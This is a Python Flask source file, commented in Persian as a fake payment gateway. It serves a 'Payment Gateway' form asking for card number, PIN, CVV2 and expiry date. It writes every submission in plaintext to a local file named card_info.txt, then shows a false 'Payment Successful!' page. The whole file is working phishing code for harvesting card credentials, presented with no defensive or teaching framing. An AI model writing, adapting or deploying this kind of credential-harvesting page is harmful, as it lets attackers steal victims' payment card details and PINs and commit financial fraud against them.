from flask import Flask, request, render_template_string

app = Flask(__name__)

# صفحه اصلی درگاه پرداخت جعلی
@app.route('/')
def index():
    return '''
    <html>
        <body style="font-family: Arial, sans-serif; background-color: #f2f2f2;">
            <div style="width: 400px; margin: 0 auto; padding-top: 50px; background-color: #fff; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);">
                <h2 style="text-align: center;">Payment Gateway</h2>
                <form action="/payment" method="POST" style="padding: 20px;">
                    <input type="text" name="card_number" placeholder="Card Number" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 5px;" required><br>
                    <input type="password" name="pin" placeholder="PIN" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 5px;" required><br>
                    <input type="text" name="cvv2" placeholder="CVV2" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 5px;" required><br>
                    <input type="text" name="expiry_date" placeholder="Expiry Date (MM/YY)" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 5px;" required><br>
                    <input type="submit" value="Pay Now" style="width: 100%; padding: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 5px;">
                </form>
            </div>
        </body>
    </html>
    '''

# صفحه پرداخت (گرفتن اطلاعات و ذخیره در فایل)
@app.route('/payment', methods=['POST'])
def payment():
    card_number = request.form['card_number']
    pin = request.form['pin']
    cvv2 = request.form['cvv2']
    expiry_date = request.form['expiry_date']
    
    # ذخیره اطلاعات در فایل
    with open("card_info.txt", "a") as file:
        file.write(f"Card Number: {card_number}, PIN: {pin}, CVV2: {cvv2}, Expiry Date: {expiry_date}\n")
    
    # شبیه‌سازی صفحه تأیید پرداخت موفق
    return '''
    <html>
        <body>
            <h2>Payment Successful!</h2>
            <p>Your payment has been processed successfully.</p>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
